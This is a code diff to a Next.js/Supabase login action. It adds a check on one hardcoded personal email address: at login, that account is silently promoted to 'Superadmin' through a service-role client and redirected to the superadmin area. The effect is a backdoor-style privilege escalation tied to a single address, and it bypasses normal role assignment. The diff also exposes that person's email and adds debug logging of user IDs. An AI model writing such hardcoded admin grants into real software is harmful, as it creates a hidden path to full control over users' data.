@@ -2,6 +2,7 @@
 
 import { createClient } from '@/utils/supabase/server'
 import { redirect } from 'next/navigation'
+import { createClient as createSupabaseClient } from '@supabase/supabase-js'
 
 export async function login(formData: FormData) {
     const email = formData.get('email') as string
@@ -44,6 +45,21 @@ export async function login(formData: FormData) {
         .select('role, is_parent')
         .eq('id', authData?.user?.id)
         .single()
+
+    // Interceptar e inyectar Superadmin si el correo coincide
+    if (email === 'marianoez.gonzalez@gmail.com' || profile?.role === 'Superadmin') {
+        if (email === 'marianoez.gonzalez@gmail.com' && profile?.role !== 'Superadmin') {
+            const adminClient = createSupabaseClient(
+                process.env.NEXT_PUBLIC_SUPABASE_URL!,
+                process.env.SUPABASE_SERVICE_ROLE_SECRET!
+            )
+            await adminClient
+                .from('profiles')
+                .update({ role: 'Superadmin' })
+                .eq('id', authData?.user?.id)
+        }
+        redirect('/superadmin')
+    }
 
     console.log("=== LOGIN DEBUG ===")
     console.log("User ID:", authData?.user?.id)
